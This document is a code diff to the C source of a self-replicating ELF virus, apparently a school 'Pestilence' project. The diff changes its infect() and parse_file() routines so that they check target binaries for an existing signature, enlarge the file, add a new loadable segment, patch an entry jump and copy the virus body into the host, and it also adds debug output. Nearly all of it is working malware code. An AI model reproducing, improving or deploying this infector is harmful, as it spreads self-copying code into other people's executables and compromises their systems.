@@ -1,3 +1,4 @@
+
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
@@ -46,6 +47,9 @@
 #endif
 #ifndef BUBONIK
 #define BUBONIK 0x402020
+#endif
+#ifndef ECHIDNAE
+#define ECHIDNAE 0x401af0
 #endif
 
 void _start(void)
@@ -375,15 +379,14 @@ clean:
 	fs_release(fd);
 }
 
-#define ELF_MAGIC			   0x464c457f
-#define MINIMAL_INJECTION_SIZE (0x1000 * 5)
+#define ELF_MAGIC 0x464c457f
 #define inout
 
 #define ACONIT	23
 #define ARSENIC 17
 
 static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
-					  inout char **file_data)
+					  inout char **file_data, inout size_t *enlarging)
 {
 	int fd;
 
@@ -391,15 +394,43 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	fd = fs_handle(path, O_RDWR);
 	if (fd < 0 || io_query(fd, statbuf) < 0)
 		goto error;
-	if (io_resize(fd, statbuf->st_size + MINIMAL_INJECTION_SIZE) < 0)
+	if (statbuf->st_size < sizeof(ElfW(Ehdr)))
 		goto error;
-	*file_data
-		= (void *) rt_vector(9, 0, statbuf->st_size + MINIMAL_INJECTION_SIZE,
-							 PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
+									MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
-	if (statbuf->st_size < sizeof(ElfW(Ehdr))
-		|| ((unsigned *) *file_data)[0] != ELF_MAGIC)
+	char  *ALPHA;
+	size_t OMEGA;
+	asm volatile("leaq str4(%%rip), %0\n"
+				 "leaq (end4-str4)(%%rip), %1\n"
+				 "jmp end4\n"
+				 "str4: .ascii \"Pestilence version 1.0 (c)oded by xxxxxxx - "
+				 "yyyyyy\\0\" \n"
+				 "end4:\n"
+				 : "=r"(ALPHA), "=r"(OMEGA));
+	int i = 0;
+	while (i + OMEGA < statbuf->st_size)
+		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
+			goto error;
+	// else
+	// {
+	// 	emit_hex(i);
+	// 	tty_putc(10);
+	// }
+
+	elf->header = (ElfW(Ehdr) *) *file_data;
+	*enlarging = VARAX;
+	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
+	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
+	vm_release(file_data, statbuf->st_size);
+	if (io_resize(fd, statbuf->st_size + *enlarging) < 0)
+		goto error;
+	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
+									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+	if (*file_data == MAP_FAILED)
+		goto error;
+	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
 		goto error;
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	if (statbuf->st_size < elf->header->e_shoff
@@ -410,8 +441,10 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		goto error;
 	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
+	fs_release(fd);
 	return (OK);
 error:
+	io_send(1, "nop nopnop\n", 12);
 	fs_release(fd);
 	return (KO);
 }
@@ -439,7 +472,10 @@ static void infect(char *path, void *begin_ptr)
 	int	   last_pt_load;
 	char  *curare;
 	size_t flower;
+	size_t enlarging;
 
+	io_send(1, path, validate_environment(path));
+	tty_putc(10);
 	asm volatile(
 		"leaq str3(%%rip), %0\n"
 		"leaq (end3-str3)(%%rip), %1\n"
@@ -450,9 +486,10 @@ static void infect(char *path, void *begin_ptr)
 		"end3:\n"
 		: "=r"(curare), "=r"(flower));
 
-	if (parse_file(path, &statbuf, &elf, &file_data))
+	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging))
 		goto clean;
-	unsigned long append_pos = (statbuf.st_size + 0x1000 - 1) & ~0xfffUL;
+	unsigned long append_pos
+		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
 	unsigned long pestis = find_first_free_page(elf);
 	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
 		   elf.header->e_phnum * elf.header->e_phentsize);
@@ -461,8 +498,8 @@ static void infect(char *path, void *begin_ptr)
 	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
 		.p_type = PT_LOAD,
 		.p_align = 0x1000,
-		.p_filesz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
-		.p_memsz = MINIMAL_INJECTION_SIZE - statbuf.st_size % 0x1000,
+		.p_filesz = enlarging,
+		.p_memsz = enlarging,
 		.p_offset = append_pos,
 		.p_paddr = pestis,
 		.p_vaddr = pestis,
@@ -489,6 +526,12 @@ static void infect(char *path, void *begin_ptr)
 	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
 	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
 	append_pos += flower;
+	emit_hex((unsigned long long) file_data);
+	tty_putc(10);
+	emit_hex(append_pos);
+	tty_putc(10);
+	emit_hex((unsigned long long) file_data + append_pos);
+	tty_putc(10);
 	// emit_hex(append_pos);
 	// tty_putc(' ');
 	// emit_hex((unsigned long long) begin_ptr);
@@ -498,5 +541,5 @@ static void infect(char *path, void *begin_ptr)
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
 clean:
 	if (file_data)
-		vm_release(file_data, statbuf.st_size + MINIMAL_INJECTION_SIZE);
+		vm_release(file_data, statbuf.st_size + enlarging);
 }
